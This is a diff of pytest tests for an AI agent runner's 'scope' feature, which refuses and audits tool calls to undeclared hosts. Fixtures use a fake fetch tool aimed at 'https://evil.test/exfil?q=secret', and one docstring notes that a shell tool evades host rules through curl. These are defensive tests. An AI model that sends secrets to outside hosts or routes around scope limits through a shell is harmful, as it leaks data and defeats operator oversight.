@@ -108,6 +108,26 @@ class ExplodingTool(Tool):
         raise ToolError("nope")
 
 
+class FakeFetch(Tool):
+    """Stands in for http_fetch: the same TYPE, so the scope table sees it, and
+    no socket, so a scope test is about the RULE rather than about the network."""
+
+    type = "http_fetch"
+    description = "fetch a url"
+    parameters = {"type": "object",
+                  "properties": {"url": {"type": "string"}},
+                  "required": ["url"]}
+
+    def run(self, arguments: dict, ctx) -> str:
+        return f"FETCHED:{arguments.get('url')}"
+
+
+@pytest.fixture
+def fake_fetch(monkeypatch):
+    monkeypatch.setitem(tool_registry.BUILTIN_TOOLS, FakeFetch.type, FakeFetch)
+    return tool_registry.BUILTIN_TOOLS
+
+
 @pytest.fixture
 def fake_tools(monkeypatch):
     """Register the doubles in the real registry for one test.
@@ -263,6 +283,12 @@ def test_as_start_meta_is_the_run_files_head_line():
         # configured" are the same bytes and the absence of a `guardrail` event
         # proves nothing. Also additive; old readers ignore it.
         "output_mode": "off",
+        # scope/unscoped for the same reason as output_mode, one layer out: a
+        # scope that is never violated is silent, so "declared nothing" and
+        # "declared something and stayed inside it" would be the same bytes.
+        # `unscoped` names the tools no target rule can bound. Both additive.
+        "scope": {},
+        "unscoped": [],
         "agents": [
             {"node_id": "n6", "name": "RESEARCHER", "provider": "fake",
              "model": "qwen2.5:7b-instruct", "tools": ["http_fetch"],
@@ -3167,6 +3193,157 @@ def test_the_router_decides_at_a_fixed_temperature(tmp_path):
                    if not any(t.get("function", {}).get("name") == "route"
                               for t in (params.get("tools") or []))]
     assert agent_calls and agent_calls[0]["temperature"] == 1.9
+
+
+# -- scope: what a run may touch --------------------------------------------
+
+
+def _fetch_doc(scope: dict = None, url: str = "https://ok.example/a") -> tuple:
+    """A one-agent graph whose only tool is a (fake) http_fetch, plus the
+    adapter that asks for *url* and then stops."""
+    doc = _doc()
+    if scope is not None:
+        _node(doc, "n3")["config"]["scope"] = scope
+    adapter = FakeAdapter([
+        ("", {"tool_calls": [{"id": "tc_1", "name": "http_fetch",
+                              "arguments": {"url": url}}]}),
+        ("done", {}),
+    ])
+    return doc, adapter
+
+
+def test_a_scope_refusal_is_audited_and_does_not_kill_the_run(
+        tmp_path, fake_fetch):
+    """Refused like an unknown tool, not raised.
+
+    An out-of-scope call is a mistake the model can correct on its next turn.
+    Killing the run over it would throw away everything the graph had already
+    banked — the same reasoning `_execute_tool` already applies to a tool name
+    the model got wrong.
+    """
+    doc, adapter = _fetch_doc({"hosts": ["*.example.com"]},
+                              url="https://evil.test/exfil?q=secret")
+    runner = _runner(tmp_path, adapter)
+    events, status, _ = _drain(runner, runner.start(
+        compile_graph(doc, _registry(adapter)), "manual"))
+    assert status == "done", "a scope refusal killed the run"
+
+    results = [e for e in events if e["t"] == "tool_result"]
+    assert len(results) == 1
+    assert results[0]["ok"] is False
+    assert "out of scope" in results[0]["output"]
+    assert "evil.test" in results[0]["output"]
+    # it never ran
+    assert "FETCHED:" not in json.dumps(events)
+    # BOTH phases, and the pair is the point: the `pending` intent line proves
+    # the model asked, the second proves it was refused. A refusal that erased
+    # the intent would hide the attempt, which is the more interesting half.
+    assert _tool_audit(tmp_path) == ["pending", "refused-out-of-scope"]
+
+
+def test_a_call_inside_the_declared_scope_still_runs(tmp_path, fake_fetch):
+    """The other half, and the one that keeps the test above honest: a rule that
+    refuses everything would pass that test too."""
+    doc, adapter = _fetch_doc({"hosts": ["*.example.com"]},
+                              url="https://a.example.com/x")
+    runner = _runner(tmp_path, adapter)
+    events, status, _ = _drain(runner, runner.start(
+        compile_graph(doc, _registry(adapter)), "manual"))
+    assert status == "done"
+    results = [e for e in events if e["t"] == "tool_result"]
+    assert len(results) == 1 and results[0]["ok"] is True
+    assert results[0]["output"] == "FETCHED:https://a.example.com/x"
+
+
+def test_an_undeclared_run_reaches_what_it_always_could(tmp_path, fake_fetch):
+    """Default-open, end to end. Every graph saved before scope existed must
+    behave exactly as it did — otherwise this is a breaking change wearing a
+    safety feature's clothes."""
+    doc, adapter = _fetch_doc(None, url="https://anywhere.test/x")
+    runner = _runner(tmp_path, adapter)
+    events, status, _ = _drain(runner, runner.start(
+        compile_graph(doc, _registry(adapter)), "manual"))
+    assert status == "done"
+    results = [e for e in events if e["t"] == "tool_result"]
+    assert len(results) == 1 and results[0]["ok"] is True
+
+
+def test_the_seatbelt_holds_end_to_end_with_no_scope_declared(
+        tmp_path, fake_fetch):
+    """The panel's own API, from an agent, with nothing configured."""
+    doc, adapter = _fetch_doc(None, url="http://127.0.0.1:7788/api/agents/run")
+    runner = _runner(tmp_path, adapter)
+    events, status, _ = _drain(runner, runner.start(
+        compile_graph(doc, _registry(adapter)), "manual"))
+    assert status == "done"
+    results = [e for e in events if e["t"] == "tool_result"]
+    assert results and results[0]["ok"] is False
+    assert "out of scope" in results[0]["output"]
+
+
+def test_scope_rides_on_the_start_meta(tmp_path, fake_fetch):
+    """A scope that is never violated is SILENT. Without the head line,
+    "declared nothing" and "declared something and stayed inside it" are the
+    same bytes — the same argument that put output_mode there."""
+    declared = {"hosts": ["*.example.com"], "paths": ["C:/work"]}
+    doc, adapter = _fetch_doc(declared, url="https://a.example.com/x")
+    runner = _runner(tmp_path, adapter)
+    events, _status, _ = _drain(runner, runner.start(
+        compile_graph(doc, _registry(adapter)), "manual"))
+    head = events[0]
+    assert head["t"] == "start"
+    assert head["scope"] == declared
+
+
+def test_the_unscoped_tools_are_named_on_the_start_meta(tmp_path, fake_tools):
+    """`shell` reaches anything a target rule forbids by spelling it `curl`.
+
+    That hole is stated at run start rather than discovered later by whoever
+    reads the audit wondering why the scope did not hold.
+    """
+    doc = _doc()
+    _node(doc, "n3")["config"]["scope"] = {"hosts": ["*.example.com"]}
+    doc["nodes"].append({"id": "n9", "type": "tool",
+                         "config": {"tool": "shell", "options": {}}})
+    doc["edges"].append({"id": "e9", "source": "n9", "target": "n6",
+                         "sourceHandle": "tool", "targetHandle": "tools"})
+    spec = compile_graph(doc, _registry())
+    assert spec.as_start_meta()["unscoped"] == ["shell"]
+
+
+def test_arguments_edited_at_an_approval_gate_are_re_scoped(
+        tmp_path, fake_fetch):
+    """The gate lets a human SUBSTITUTE arguments, so a check placed before it
+    would be checking the proposal and trusting the edit.
+
+    This passes because the scope check sits in `_execute_tool`, downstream of
+    the interrupt — a property of where the check went, which is exactly the kind
+    of thing that holds by luck until someone moves it.
+    """
+    doc, adapter = _fetch_doc({"hosts": ["*.example.com"]},
+                              url="https://a.example.com/fine")
+    _node(doc, "n5")["config"]["require_approval"] = True
+    runner = _runner(tmp_path, adapter)
+    run_id = runner.start(compile_graph(doc, _registry(adapter)), "manual")
+
+    deadline = time.monotonic() + 10
+    while time.monotonic() < deadline:
+        if runner.read_since(run_id, 0)["status"] == "paused":
+            break
+        time.sleep(0.02)
+    else:                                        # pragma: no cover
+        raise AssertionError("the approval gate never opened")
+
+    spec = compile_graph(doc, _registry(adapter))
+    runner.resume(run_id, {"decision": "edit",
+                           "arguments": {"url": "https://evil.test/exfil"}},
+                  spec=spec)
+    events, status, _ = _drain(runner, run_id)
+    assert status == "done"
+    results = [e for e in events if e["t"] == "tool_result"]
+    assert results and results[-1]["ok"] is False
+    assert "out of scope" in results[-1]["output"], \
+        "a human-edited argument bypassed the scope check"
 
 
 def test_start_meta_records_output_mode(tmp_path, fake_tools):
